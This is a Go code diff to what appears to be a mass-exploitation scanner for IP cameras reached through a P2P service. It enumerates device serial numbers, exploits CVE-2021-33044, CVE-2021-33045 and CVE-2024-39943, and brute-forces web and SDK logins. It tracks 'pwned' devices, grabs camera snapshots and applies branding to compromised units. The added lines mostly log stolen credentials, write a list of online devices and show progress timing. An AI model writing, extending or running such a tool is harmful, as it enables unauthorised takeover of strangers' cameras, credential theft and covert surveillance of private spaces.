@@ -35,8 +35,10 @@ type Scanner struct {
 	snapshotWg  sync.WaitGroup
 	cancelOnce  sync.Once
 	pwnedList   []ExploitResult
+	onlineList  []string
 	cancelChan  chan struct{}
 	interrupted bool
+	startTime   time.Time
 }
 
 func NewScanner(targets []string, config *Config, threads int, outDir string, inputSource string) *Scanner {
@@ -47,6 +49,7 @@ func NewScanner(targets []string, config *Config, threads int, outDir string, in
 		OutDir:      outDir,
 		InputSource: inputSource,
 		cancelChan:  make(chan struct{}),
+		startTime:   time.Now(),
 	}
 }
 
@@ -143,29 +146,35 @@ func (s *Scanner) Run() {
 			defer nurseWg.Done()
 			for serial := range handshakeChan {
 				if !p2p.CheckOnline(serial) {
+					Debugf("sn %s offline", serial)
 					s.mu.Lock()
 					s.WasteCount++
 					s.CompletedCount++
 					s.mu.Unlock()
 					continue
 				}
+				Debugf("sn %s valid..... online, handshaking", serial)
 				var ok bool
 				for attempt := 0; attempt < retries; attempt++ {
 					client := p2p.NewDHClient(serial, false)
 					client.SetRetries(retries)
 					err := client.Handshake()
 					if err != nil {
+						Debugf("sn %s handshake failed (attempt %d/%d): %v", serial, attempt+1, retries, err)
 						client.Close()
 						continue
 					}
+					Debugf("sn %s handshake success", serial)
 					s.mu.Lock()
 					s.OnlineCount++
+					s.onlineList = append(s.onlineList, serial)
 					s.mu.Unlock()
 					onlineChan <- onlineResult{serial: serial, client: client}
 					ok = true
 					break
 				}
 				if !ok {
+					Debugf("sn %s unreachable after %d retries", serial, retries)
 					s.mu.Lock()
 					s.SafeCount++
 					s.CompletedCount++
@@ -182,8 +191,10 @@ func (s *Scanner) Run() {
 				goto cleanup
 			default:
 			}
+			Debugf("checking sn %s ... full serial target", target)
 			handshakeChan <- target
 		} else if len(target) == 10 {
+			Debugf("checking sn prefix %s .... generating suffixes", target)
 			for _, r := range ranges {
 				for i := r.Start; i < r.End; i++ {
 					select {
@@ -195,6 +206,8 @@ func (s *Scanner) Run() {
 					handshakeChan <- target + suffix
 				}
 			}
+		} else {
+			Debugf("skipping invalid input %s (must be 10-char prefix or 15-char S/N)", target)
 		}
 	}
 
@@ -209,6 +222,7 @@ cleanup:
 	fmt.Println()
 
 	s.writePwnedFinished()
+	s.writeOnlineList()
 	doneTimeStr := time.Now().Format("15:04:05")
 	fmt.Printf("\x1b[32m[%s] Done\x1b[0m\n", doneTimeStr)
 }
@@ -312,6 +326,7 @@ func (s *Scanner) processOnlineClient(serial string, client *p2p.DHClient) {
 	s.SafeCount++
 	s.CompletedCount++
 	s.mu.Unlock()
+	Debugf("sn %s tunnel setup failed after %d retries", serial, retries)
 }
 
 func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2p.PTCPTunnel, directOK bool) {
@@ -357,8 +372,10 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 
 	if s.Config.Pwn.Protocol["cgi"] {
 		if s.Config.Pwn.Methods["cve-2021-33044"] {
+			Debugf("exploiting sn %s with CVE-2021-33044", serial)
 			res, err := TryCVE2021_33044(tunnel)
 			if err == nil && res != nil && res.Password != "" {
+				Debugf("sn %s CVE-2021-33044 success..... creds %s:%s", serial, res.Login, res.Password)
 				activeTunnel, fresh := reopenVerifiedTunnel(res)
 				res.IP = ip
 				s.handlePwned(serial, res)
@@ -378,8 +395,10 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 		}
 
 		if s.Config.Pwn.Methods["cve-2021-33045"] {
+			Debugf("exploiting sn %s with CVE-2021-33045", serial)
 			res, err := TryCVE2021_33045(tunnel)
 			if err == nil && res != nil && res.Password != "" {
+				Debugf("sn %s CVE-2021-33045 success..... creds %s:%s", serial, res.Login, res.Password)
 				activeTunnel, fresh := reopenVerifiedTunnel(res)
 				res.IP = ip
 				s.handlePwned(serial, res)
@@ -399,8 +418,10 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 		}
 
 		if s.Config.Pwn.Methods["cve-2024-39943"] {
+			Debugf("exploiting sn %s with CVE-2024-39943 (dummy user %s)", serial, s.Config.Dummy.Login)
 			res, err := TryCVE2024_39943(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password)
 			if err == nil && res != nil {
+				Debugf("sn %s CVE-2024-39943 success..... creds %s:%s", serial, res.Login, res.Password)
 				res.IP = ip
 				s.handlePwned(serial, res)
 				s.applyBranding(tunnel, serial, res)
@@ -415,8 +436,10 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 		}
 
 		if s.Config.Pwn.Methods["brute"] {
-			res, err := TryBruteForceWeb(tunnel, s.Config.Brute.Credentials)
+			Debugf("bruteing sn %s with web cgi credentials", serial)
+			res, err := TryBruteForceWeb(tunnel, s.Config.Brute.Credentials, serial)
 			if err == nil && res != nil {
+				Debugf("sn %s with %s:%s success..... (CGI brute)", serial, res.Login, res.Password)
 				res.IP = ip
 				s.handlePwned(serial, res)
 				s.applyBranding(tunnel, serial, res)
@@ -432,8 +455,10 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 	}
 
 	if s.Config.Pwn.Protocol["sdk"] && s.Config.Pwn.Methods["brute"] {
-		res, err := TryBruteForceSDK(tunnel, s.Config.Brute.Credentials)
+		Debugf("bruteing sn %s with sdk credentials", serial)
+		res, err := TryBruteForceSDK(tunnel, s.Config.Brute.Credentials, serial)
 		if err == nil && res != nil {
+			Debugf("sn %s with %s:%s success..... (SDK brute)", serial, res.Login, res.Password)
 			res.IP = ip
 			s.handlePwned(serial, res)
 			s.applyBranding(tunnel, serial, res)
@@ -451,12 +476,15 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 	s.SafeCount++
 	s.CompletedCount++
 	s.mu.Unlock()
+	Debugf("sn %s not pwned..... all methods failed", serial)
 }
 
 func (s *Scanner) launchSnapshot(serial string, res *ExploitResult) bool {
 	if !s.Config.Pwn.Snapshot || res == nil || res.Channels <= 0 || res.Login == "" || res.Password == "" {
 		return false
 	}
+
+	Debugf("downloading image from %s..... (%d channels)", serial, res.Channels)
 
 	method := res.Method
 	login := res.Login
@@ -622,6 +650,22 @@ func (s *Scanner) writePwnedFinished() {
 	}
 }
 
+func (s *Scanner) writeOnlineList() {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+
+	onlineFile := filepath.Join(s.OutDir, "online.txt")
+	f, err := os.OpenFile(onlineFile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
+	if err != nil {
+		return
+	}
+	defer f.Close()
+
+	for _, serial := range s.onlineList {
+		f.WriteString(serial + "\n")
+	}
+}
+
 func (s *Scanner) printProgress() {
 	s.mu.Lock()
 	defer s.mu.Unlock()
@@ -639,7 +683,28 @@ func (s *Scanner) printProgress() {
 		pctStr = fmt.Sprintf("%.1f%%", pct)
 	}
 
-	line := fmt.Sprintf("[%s] pwned > %d | online > %d | waste > %d",
-		pctStr, s.PwnedCount, s.OnlineCount, s.WasteCount)
+	elapsed := time.Since(s.startTime)
+	remaining := time.Duration(0)
+	if s.CompletedCount > 0 && s.TotalCount > 0 {
+		rate := float64(s.CompletedCount) / elapsed.Seconds()
+		if rate > 0 {
+			totalSeconds := float64(s.TotalCount) / rate
+			remainingMs := int64(totalSeconds*1000) - elapsed.Milliseconds()
+			if remainingMs > 0 {
+				remaining = time.Duration(remainingMs) * time.Millisecond
+			}
+		}
+	}
+
+	line := fmt.Sprintf("[%s] %s/%s pwned > %d | online > %d | waste > %d",
+		pctStr, formatDuration(elapsed), formatDuration(remaining), s.PwnedCount, s.OnlineCount, s.WasteCount)
 	fmt.Printf("\033[2K\r%s", line)
+}
+
+func formatDuration(d time.Duration) string {
+	d = d.Abs()
+	hours := int(d.Hours())
+	minutes := int(d.Minutes()) % 60
+	seconds := int(d.Seconds()) % 60
+	return fmt.Sprintf("%02d:%02d:%02d", hours, minutes, seconds)
 }
